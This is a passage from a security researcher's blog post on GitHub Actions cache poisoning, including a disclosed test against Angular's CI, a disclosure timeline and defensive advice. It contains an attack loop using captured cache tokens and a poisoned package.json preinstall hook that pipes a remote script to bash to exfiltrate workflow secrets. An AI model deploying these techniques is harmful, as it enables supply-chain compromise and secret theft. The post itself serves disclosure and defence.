   python3 CacheUpload.py --file-path poisoned_cache.tzstd --key &lt;target_key&gt; --version &lt;target_version&gt; --auth-token $CAPTURED_TOKEN --cache-url $CAPTURED_URL
   # Insert lines as necessary.
   sleep 60s
done</code></pre>



<p>Now start the script, if you are in the United States, go to bed. <s>When you wake up, you should be greeted to a page that looks something like the following</s>:</p>



<p>Who am I kidding? You’re not going to sleep. If you’re doing this the first time the adrenaline will keep you up. If it worked, then all of the cache entries are now poisoned with your payload. Note how the file size is 5.7 KB! That was the size of my payload containing just the <code>package.json</code> files.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="540" data-permalink="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/angular_poisoned/" data-orig-file="https://adnanthekhan.com/wp-content/uploads/2024/03/angular_poisoned.png" data-orig-size="2822,1476" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="angular_poisoned" data-image-description="" data-image-caption="" data-medium-file="https://adnanthekhan.com/wp-content/uploads/2024/03/angular_poisoned.png?w=300" data-large-file="https://adnanthekhan.com/wp-content/uploads/2024/03/angular_poisoned.png?w=1024" loading="lazy" width="1024" height="535" src="https://adnanthekhan.com/wp-content/uploads/2024/03/angular_poisoned.png?w=1024" alt="" class="wp-image-540" srcset="https://adnanthekhan.com/wp-content/uploads/2024/03/angular_poisoned.png?w=1024 1024w, https://adnanthekhan.com/wp-content/uploads/2024/03/angular_poisoned.png?w=2046 2046w, https://adnanthekhan.com/wp-content/uploads/2024/03/angular_poisoned.png?w=150 150w, https://adnanthekhan.com/wp-content/uploads/2024/03/angular_poisoned.png?w=300 300w, https://adnanthekhan.com/wp-content/uploads/2024/03/angular_poisoned.png?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>If you designed your payload correctly, your C2 domain will receive secrets every time the workflows run.</p>



<h3 class="wp-block-heading" id="don-t-accidentally-break-everything">Don’t Accidentally Break Everything!</h3>



<p>I want to be extremely clear here – all of this information is for educational purposes, and you should not use these techniques against companies without permission. Even for bug bounties, depending on what kind of workflow you can move laterally to and what your injection point is, you might accidentally end up poisoning releases. Once a cache entry is poisoned it needs to be deleted by someone with write access to a repository. A poisoned cache might stay poisoned for <em>months </em>if not noticed and it is used frequently by jobs.</p>



<h1 class="wp-block-heading" id="angular">Angular</h1>



<p>Initially, I reported the issue to Angular and had a back and forth about reproduction conditions. Google was not able to reproduce this in a fork and gave me permission to test this against the production repository.</p>



<h2 class="wp-block-heading" id="bug-background">Bug Background</h2>



<p>The angular/angular repository had a workflow that ran SauceLabs integration tests on PRs without any approval requirements for fork PRs. The workflow ran on <code>pull_request_target</code> within the <code>main</code> branch, but had the <code>GITHUB_TOKEN</code> permissions restricted to read-only. This is a traditional “Pwn Request”.</p>



<p>The workflow was introduced back in October, and the only impact from this was that someone could steal the SauceLabs token. The impact from this is low, and while it is not “ideal” to run a workflow in this manner Google most likely accepted the risk from this. </p>



<p>That was before cache poisoning came into play, and is a cautionary tale about why it’s good to fix low risk bugs – they might turn into high risk bugs!</p>



<h3 class="wp-block-heading" id="pwn-request">Pwn Request</h3>



<figure class="wp-block-image size-large"><img data-attachment-id="630" data-permalink="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/image-2-4/" data-orig-file="https://adnanthekhan.com/wp-content/uploads/2024/04/image-2.png" data-orig-size="2766,1184" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-2" data-image-description="" data-image-caption="" data-medium-file="https://adnanthekhan.com/wp-content/uploads/2024/04/image-2.png?w=300" data-large-file="https://adnanthekhan.com/wp-content/uploads/2024/04/image-2.png?w=1024" loading="lazy" width="1024" height="438" src="https://adnanthekhan.com/wp-content/uploads/2024/04/image-2.png?w=1024" alt="" class="wp-image-630" srcset="https://adnanthekhan.com/wp-content/uploads/2024/04/image-2.png?w=1024 1024w, https://adnanthekhan.com/wp-content/uploads/2024/04/image-2.png?w=2046 2046w, https://adnanthekhan.com/wp-content/uploads/2024/04/image-2.png?w=150 150w, https://adnanthekhan.com/wp-content/uploads/2024/04/image-2.png?w=300 300w, https://adnanthekhan.com/wp-content/uploads/2024/04/image-2.png?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>I used my account and <a href="https://github.com/angular/angular/pull/54781/files">created a pull request</a> to grab the cache token using the pwn request’s injection point and went to work trying to poison the cache.</p>



<h2 class="wp-block-heading" id="preparing-the-payload">Preparing the Payload</h2>



<p>For Angular, I used a payload to overwrite the <code>package.json</code> file with one that contained an added preinstall step with an exfiltration payload.</p>


<div class="wp-block-syntaxhighlighter-code "><div><div id="highlighter_658022" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">"scripts": {</code></div><div class="line number2 index1 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"/": "",</code></div><div class="line number3 index2 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"// 1": "Many of our checks/scripts/tools have moved to our ng-dev tool",</code></div><div class="line number4 index3 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"// 2": "Find the usage you are looking for with:",</code></div><div class="line number5 index4 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"// 3": "yarn ng-dev --help",</code></div><div class="line number6 index5 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"/ ": "",</code></div><div class="line number7 index6 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"preinstall": "curl -sSfL <a href="https://gist.githubusercontent.com/umbr4g3/4fc182f6af6a6bfcda0bdc19e5b2e10d/raw/5a555639a4c36b9158564d4f80794ff603e02969/test1.sh">https://gist.githubusercontent.com/umbr4g3/4fc182f6af6a6bfcda0bdc19e5b2e10d/raw/5a555639a4c36b9158564d4f80794ff603e02969/test1.sh</a> | bash",</code></div><div class="line number8 index7 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"postinstall": "node --preserve-symlinks --preserve-symlinks-main ./tools/postinstall-patches.js &amp;&amp; patch-package --patch-dir tools/esm-interop/patches/npm &amp;&amp; patch-package --patch-dir tools/npm</code></div><div class="line number9 index8 alt2"><code class="plain plain">-patches",</code></div><div class="line number10 index9 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">"prepare": "husky",</code></div></div></td></tr></tbody></table></div></div></div>


<p>You can see the structure of the <code>tzstd</code> file I created below. For good measure I included poisoned <code>package.json</code> files for both <code>aio</code> and the base <code>package.json</code>.</p>



<pre class="wp-block-code"><code>❯ tar tf angular_poison1.tzstd
aio/
aio/package.json
package.json</code></pre>



<h2 class="wp-block-heading" id="filling-the-cache">Filling the Cache</h2>



<p>This was my first foray into cache poisoning a high-visibility repository that was not my own. My PoC script to upload values did have some limitations because I did not implement chunking, which is necessary to send larger entries. As a result I just opted to upload a large number of 300 MB chunks.</p>



<p>To speed up the “cache stuffing” process, I used a private repository to run a number of workflow jobs that essentially did the following:</p>



<ul class="wp-block-list">
<li>Generated 300 MB of random data</li>



<li>Uploaded it to the cache using the cache token and URL I had captured from Angular earlier.</li>
</ul>



<p>This worked much better than trying to upload the values from my home connection as the upload speeds from a GitHub hosted runner to Azure blob store were much faster.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="565" data-permalink="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/screenshot-2024-03-08-223021/" data-orig-file="https://adnanthekhan.com/wp-content/uploads/2024/04/screenshot-2024-03-08-223021.png" data-orig-size="2614,1240" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2024-03-08-223021" data-image-description="" data-image-caption="" data-medium-file="https://adnanthekhan.com/wp-content/uploads/2024/04/screenshot-2024-03-08-223021.png?w=300" data-large-file="https://adnanthekhan.com/wp-content/uploads/2024/04/screenshot-2024-03-08-223021.png?w=1024" loading="lazy" width="1024" height="485" src="https://adnanthekhan.com/wp-content/uploads/2024/04/screenshot-2024-03-08-223021.png?w=1024" alt="" class="wp-image-565" srcset="https://adnanthekhan.com/wp-content/uploads/2024/04/screenshot-2024-03-08-223021.png?w=1022 1022w, https://adnanthekhan.com/wp-content/uploads/2024/04/screenshot-2024-03-08-223021.png?w=2045 2045w, https://adnanthekhan.com/wp-content/uploads/2024/04/screenshot-2024-03-08-223021.png?w=150 150w, https://adnanthekhan.com/wp-content/uploads/2024/04/screenshot-2024-03-08-223021.png?w=300 300w, https://adnanthekhan.com/wp-content/uploads/2024/04/screenshot-2024-03-08-223021.png?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p class="has-text-align-center">A very full cache</p>



<h2 class="wp-block-heading" id="winning-the-race-condition">Winning the Race Condition</h2>



<p>Angular is a very busy repository that gets a lot of PRs 24/7. A quirk of this repository was that the workflow I used to inject ran on pull_request_target and used caching itself. This means that every updated or opened pull request would refresh the cache keys. If I did manage to clear the reserved keys I would have a few minutes at most.</p>



<p>After filling the cache far beyond the 10 GB limit, I ran a script to programmatically try to replace the cache entries that I wanted to poison. I identified the current cache keys and versions and wrote a script that would run for 240 minutes, trying each minute to save the cache entry.</p>



<h2 class="wp-block-heading" id="success-but-i-broke-everything">Success…but I broke everything.</h2>



<p>My attempt at poisoning the cache “worked”. I was able to poison the cache entry and now every time there was a cache hit, it would replace the <code>package.json</code> file with mine. The only problem was that I had created my PoC a few days prior, and the <code>package.json</code> file had been updated since then. As a result, all of their CI/CD workflows broke due to a mismatch between the <code>package.json</code> and the <code>package.lock</code> file.</p>



<p>The screenshot below shows a scheduled workflow running a curl command from my poisoned <code>package.json</code>. This is a very sneaky attack vector because there is no indication of tampering in the source code.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="545" data-permalink="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/boundary_broken/" data-orig-file="https://adnanthekhan.com/wp-content/uploads/2024/03/boundary_broken.png" data-orig-size="3194,1736" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="boundary_broken" data-image-description="" data-image-caption="" data-medium-file="https://adnanthekhan.com/wp-content/uploads/2024/03/boundary_broken.png?w=300" data-large-file="https://adnanthekhan.com/wp-content/uploads/2024/03/boundary_broken.png?w=1024" loading="lazy" width="1024" height="556" src="https://adnanthekhan.com/wp-content/uploads/2024/03/boundary_broken.png?w=1024" alt="" class="wp-image-545" srcset="https://adnanthekhan.com/wp-content/uploads/2024/03/boundary_broken.png?w=1024 1024w, https://adnanthekhan.com/wp-content/uploads/2024/03/boundary_broken.png?w=2046 2046w, https://adnanthekhan.com/wp-content/uploads/2024/03/boundary_broken.png?w=150 150w, https://adnanthekhan.com/wp-content/uploads/2024/03/boundary_broken.png?w=300 300w, https://adnanthekhan.com/wp-content/uploads/2024/03/boundary_broken.png?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>I quickly let Google know and also provided steps to fix this by deleting the poisoned cache entries manually.</p>



<p>Imagine if the Xz GitHub repository used a workflow to push the build artifact, and Jia Tan only poisoned the cache. If done correctly, GitHub Actions cache poisoning could lead to a supply chain attack where there is no evidence anything happened, especially if by the time someone finds out, the poisoned cache entry is aged off or evicted.</p>



<p>Think about this for a moment. How would the investigation look?</p>



<ul class="wp-block-list">
<li>The code? Clean.</li>



<li>The host? Ephemeral.</li>



<li>The run logs? As expected.</li>



<li>The SBOM? Nothing unusual.</li>



<li>The poisoned entry? It aged off due to an update and evicted days later.</li>



<li>Evidence of a malicious PR? The attacker got their account banned and the PR disappeared.</li>
</ul>



<p>Done correctly, a GitHub Actions cache poisoning attack could lead to a scenario where an attacker tampers a with package but there is close to no evidence of how actually happened.</p>



<p>Let’s hope that GitHub decides to embrace defense in depth before this technique becomes more than a research project for me to make a few thousand dollars off of.</p>



<h2 class="wp-block-heading" id="disclosure-timeline">Disclosure Timeline</h2>



<ul class="wp-block-list">
<li><strong>March 5th, 2024</strong> – Discloure Sent to Google’s VRP</li>



<li><strong>March 8th, 2024 </strong>– Discussion with Triage</li>



<li><strong>March 9th, 2024 </strong>– Stuffed Cache and Planted Payload</li>



<li><strong>March 9th, 2024</strong> – Poisoned Cache Entries take effect and break Angular’s CI/CD builds.</li>



<li><strong>March 9th, 2024</strong> – Updated the report and also informed developers how to fix the issue by deleting the specific poisoned entries.</li>



<li><strong>March 11th, 2024</strong> – Bug report Accepted by Google</li>



<li><strong>March 19th, 2024 </strong>– Awarded $1000 bounty for a non-supply chain issue since the impact was only to the documentation websites.</li>
</ul>



<p>As always, I want to thank Google VRP for a very smooth disclosure process. Google’s VRP is one of the best in the industry in terms of their speed of triage, expertise of their security engineers, and most of all their down to earth view of security issues. If it can cause harm to them or their customers, then they usually accept it as a bug.</p>



<h1 class="wp-block-heading" id="key-takeaways">Key Takeaways</h1>



<p>In my post, I primarily focused on the Public Poisoned Pipeline Execution -&gt; Cache Poisoning route. Ultimately, <em>any </em>arbitrary code exec in the default branch allows for cache poisoning throughout any workflows that use caching. This could be from a poisoned dependency, a compromised account or malicious insider (e.g. Xz).</p>



<p>If a malicious insider wanted to backdoor a release, and that release build used caching, then it would allow for a backdoor that would be <em>extremely </em>hard to catch.</p>



<h2 class="wp-block-heading" id="will-provenance-save-us">Will Provenance Save Us?</h2>



<p>On May 2nd, GitHub announced a public beta for artifact attestation. This allows cryptographically verifying that an artifact was build in a specific workflow. It’s important to remember this statement from their announcement post:</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>It’s important to note that&nbsp;<strong>provenance by itself doesn’t make your artifact or your build process secure</strong>. What it&nbsp;<em>does</em>&nbsp;do is create a tamper-proof guarantee that the thing you’re&nbsp;<em>executing</em>&nbsp;is definitely the thing that you&nbsp;<em>built</em>, which can stop many attack vectors.</p>
</blockquote>



<p>Attestation only creates a tamper-proof guarantee between an artifact and a build job + commit. Common build pitfalls like referencing un-trusted third party reusable actions can lead to build integrity compromise.</p>



<p>Cache poisoning is unique in that it is very hard to detect for someone consuming an artifact. Provenance also links the artifact to the workflow file definition. A consumer can see that the workflow that built an artifact uses insecure actions and choose not to trust the binary. With cache poisoning this is harder if not impossible, because there is no way to inspect the contents of build caches as a consumer of a software package.</p>



<p>Let’s imagine a scenario where a golang package has a release workflow that does everything right and the maintainers have gone above and beyond to match SLSA 3 build integrity. They’ve even had the workflow independently reviewed and are now publishing signed assets along with build provenance that matches the release binary with the source code used to build it.</p>



<ul class="wp-block-list">
<li>Ephemeral build environment using GitHub Actions hosted runners.</li>



<li>Deployment environments with required approvals and self-review disabled.</li>



<li>OIDC authentication to push release artifacts instead of a token as a secret.</li>



<li>Immutable (SHA pinned) reusable actions within the workflow.</li>



<li>Signed build provenance.</li>
</ul>



<p>Everything is perfect…except the maintainers decided to use the <a href="https://github.com/actions/setup-go">setup-go</a> action. V4 of the action enabled caching by default.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="699" data-permalink="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/image-43/" data-orig-file="https://adnanthekhan.com/wp-content/uploads/2024/05/image.png" data-orig-size="1546,574" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-image-caption="" data-medium-file="https://adnanthekhan.com/wp-content/uploads/2024/05/image.png?w=300" data-large-file="https://adnanthekhan.com/wp-content/uploads/2024/05/image.png?w=1024" loading="lazy" width="1024" height="380" src="https://adnanthekhan.com/wp-content/uploads/2024/05/image.png?w=1024" alt="" class="wp-image-699" srcset="https://adnanthekhan.com/wp-content/uploads/2024/05/image.png?w=1024 1024w, https://adnanthekhan.com/wp-content/uploads/2024/05/image.png?w=150 150w, https://adnanthekhan.com/wp-content/uploads/2024/05/image.png?w=300 300w, https://adnanthekhan.com/wp-content/uploads/2024/05/image.png?w=768 768w, https://adnanthekhan.com/wp-content/uploads/2024/05/image.png 1546w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Cache poisoning lets anyone that can execute code in the context of the default branch overwrite arbitrary files running in workflows that use caching. To demonstrate this, I added a toy example to my cache blasting repository. It’s a simple golang “Hello World” application with signed build provenance. Instead of printing “Hello World”, as the signed build provenance says it should, it prints something else.</p>



<h3 class="wp-block-heading" id="the-most-devious-backdoor">The Most Devious Backdoor</h3>



<p>I’ve created two <a href="https://github.com/AdnaneKhan/ActionsCacheBlasting/releases">releases</a> with attestations: <a href="https://github.com/AdnaneKhan/ActionsCacheBlasting/attestations/792160">test1</a> and <a href="https://github.com/AdnaneKhan/ActionsCacheBlasting/attestations/792161">test2</a>. The attestations map to the <code>hello</code> release artifact, a compiled Linux x64 binary. Both releases are associated with the same commit. The source code says it should print <code>Hello, World!</code>. But when I run them…</p>



<figure class="wp-block-image size-large"><img data-attachment-id="719" data-permalink="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/image-7-3/" data-orig-file="https://adnanthekhan.com/wp-content/uploads/2024/05/image-7.png" data-orig-size="2222,328" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-7" data-image-description="" data-image-caption="" data-medium-file="https://adnanthekhan.com/wp-content/uploads/2024/05/image-7.png?w=300" data-large-file="https://adnanthekhan.com/wp-content/uploads/2024/05/image-7.png?w=1024" loading="lazy" width="1024" height="151" src="https://adnanthekhan.com/wp-content/uploads/2024/05/image-7.png?w=1024" alt="" class="wp-image-719" srcset="https://adnanthekhan.com/wp-content/uploads/2024/05/image-7.png?w=1024 1024w, https://adnanthekhan.com/wp-content/uploads/2024/05/image-7.png?w=2048 2048w, https://adnanthekhan.com/wp-content/uploads/2024/05/image-7.png?w=150 150w, https://adnanthekhan.com/wp-content/uploads/2024/05/image-7.png?w=300 300w, https://adnanthekhan.com/wp-content/uploads/2024/05/image-7.png?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<figure class="wp-block-image size-large"><img data-attachment-id="721" data-permalink="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/image-8-3/" data-orig-file="https://adnanthekhan.com/wp-content/uploads/2024/05/image-8.png" data-orig-size="2218,282" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-8" data-image-description="" data-image-caption="" data-medium-file="https://adnanthekhan.com/wp-content/uploads/2024/05/image-8.png?w=300" data-large-file="https://adnanthekhan.com/wp-content/uploads/2024/05/image-8.png?w=1024" loading="lazy" width="1024" height="130" src="https://adnanthekhan.com/wp-content/uploads/2024/05/image-8.png?w=1024" alt="" class="wp-image-721" srcset="https://adnanthekhan.com/wp-content/uploads/2024/05/image-8.png?w=1024 1024w, https://adnanthekhan.com/wp-content/uploads/2024/05/image-8.png?w=2048 2048w, https://adnanthekhan.com/wp-content/uploads/2024/05/image-8.png?w=150 150w, https://adnanthekhan.com/wp-content/uploads/2024/05/image-8.png?w=300 300w, https://adnanthekhan.com/wp-content/uploads/2024/05/image-8.png?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<figure class="wp-block-image size-large"><img data-attachment-id="717" data-permalink="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/image-5-3/" data-orig-file="https://adnanthekhan.com/wp-content/uploads/2024/05/image-5.png" data-orig-size="1454,122" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-5" data-image-description="" data-image-caption="" data-medium-file="https://adnanthekhan.com/wp-content/uploads/2024/05/image-5.png?w=300" data-large-file="https://adnanthekhan.com/wp-content/uploads/2024/05/image-5.png?w=1024" loading="lazy" width="1024" height="85" src="https://adnanthekhan.com/wp-content/uploads/2024/05/image-5.png?w=1024" alt="" class="wp-image-717" srcset="https://adnanthekhan.com/wp-content/uploads/2024/05/image-5.png?w=1024 1024w, https://adnanthekhan.com/wp-content/uploads/2024/05/image-5.png?w=1013 1013w, https://adnanthekhan.com/wp-content/uploads/2024/05/image-5.png?w=150 150w, https://adnanthekhan.com/wp-content/uploads/2024/05/image-5.png?w=300 300w, https://adnanthekhan.com/wp-content/uploads/2024/05/image-5.png?w=768 768w, https://adnanthekhan.com/wp-content/uploads/2024/05/image-5.png 1454w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<figure class="wp-block-image size-large"><img data-attachment-id="716" data-permalink="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/image-4-4/" data-orig-file="https://adnanthekhan.com/wp-content/uploads/2024/05/image-4.png" data-orig-size="1452,122" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-4" data-image-description="" data-image-caption="" data-medium-file="https://adnanthekhan.com/wp-content/uploads/2024/05/image-4.png?w=300" data-large-file="https://adnanthekhan.com/wp-content/uploads/2024/05/image-4.png?w=1024" loading="lazy" width="1024" height="86" src="https://adnanthekhan.com/wp-content/uploads/2024/05/image-4.png?w=1024" alt="" class="wp-image-716" srcset="https://adnanthekhan.com/wp-content/uploads/2024/05/image-4.png?w=1024 1024w, https://adnanthekhan.com/wp-content/uploads/2024/05/image-4.png?w=150 150w, https://adnanthekhan.com/wp-content/uploads/2024/05/image-4.png?w=300 300w, https://adnanthekhan.com/wp-content/uploads/2024/05/image-4.png?w=768 768w, https://adnanthekhan.com/wp-content/uploads/2024/05/image-4.png 1452w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>There is <strong>nothing </strong>you can determine from the workflow, the source commit, etc. that there is anything wrong. The <em><strong>only </strong></em>way to determine there is something wrong is by reverse engineering the artifact. This does not scale, and automated tools to detect tampering only mean attackers just have to use better obfuscation.</p>



<p>Don’t get me wrong, GitHub Actions build attestation and provenance in general is a big step forward for supply chain security, but it is important not to fall into the pattern of trust simply because something checks a box.</p>



<h2 class="wp-block-heading" id="don-t-use-actions-caching-in-release-builds">Don’t Use Actions Caching in Release Builds</h2>



<p>In order for a build to be considered SLSA L3 compliant, it must be within an <a href="https://slsa.dev/spec/v1.0/requirements#isolated">isolated</a> build environment. On the topic of caching, SLSA requirements state the following:</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>It MUST NOT be possible for one build to inject false entries into a build cache used by another build, also known as “cache poisoning”. In other words, the output of the build MUST be identical whether or not the cache is used.</p>
</blockquote>



<p>Under these requirements, GitHub Actions release builds that use caching cannot be considered SLSA L3 compliant. <strong>Full stop</strong>.</p>



<p>Until GitHub decides that the security of their users is important enough to harden their caching functionality, the best way to protect the integrity of releases is to avoid using GitHub Actions caching entirely for release workflows.</p>



<h1 class="wp-block-heading" id="references">References</h1>



<ul class="wp-block-list">
<li><a href="https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows">https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows</a></li>



<li><a href="https://scribesecurity.com/blog/github-cache-poisoning/">https://scribesecurity.com/blog/github-cache-poisoning/</a></li>



<li><a href="https://github.com/actions/toolkit">https://github.com/actions/toolkit</a></li>



<li><a href="https://github.com/AdnaneKhan/ActionsCacheBlasting">https://github.com/AdnaneKhan/ActionsCacheBlasting</a></li>



<li><a href="https://slsa.dev/spec/v1.0/requirements">https://slsa.dev/spec/v1.0/requirements</a></li>



<li><a href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/">https://securitylab.github.com/research/github-actions-preventing-pwn-requests/</a></li>



<li><a href="https://github.blog/changelog/2024-05-02-artifact-attestations-public-beta/">https://github.blog/changelog/2024-05-02-artifact-attestations-public-beta/</a></li>
</ul>
<div id="jp-post-flair" class="sharedaddy sd-like-enabled"><div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul data-sharing-events-added="true"><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-454" class="share-twitter sd-button share-icon" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/?share=twitter&amp;nb=1" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-454" class="share-facebook sd-button share-icon" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/?share=facebook&amp;nb=1" target="_blank" title="Click to share on Facebook"><span>Facebook</span></a></li><li class="share-end"></li></ul></div></div></div><div class="sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded" id="like-post-wrapper-227025655-454-666b7ab0c2028" data-src="//widgets.wp.com/likes/index.html?ver=20240613#blog_id=227025655&amp;post_id=454&amp;origin=adnanthekhancom.wordpress.com&amp;obj_id=227025655-454-666b7ab0c2028&amp;domain=adnanthekhan.com" data-name="like-post-frame-227025655-454-666b7ab0c2028" data-title="Like or Reblog"><div class="likes-widget-placeholder post-likes-widget-placeholder" style="height: 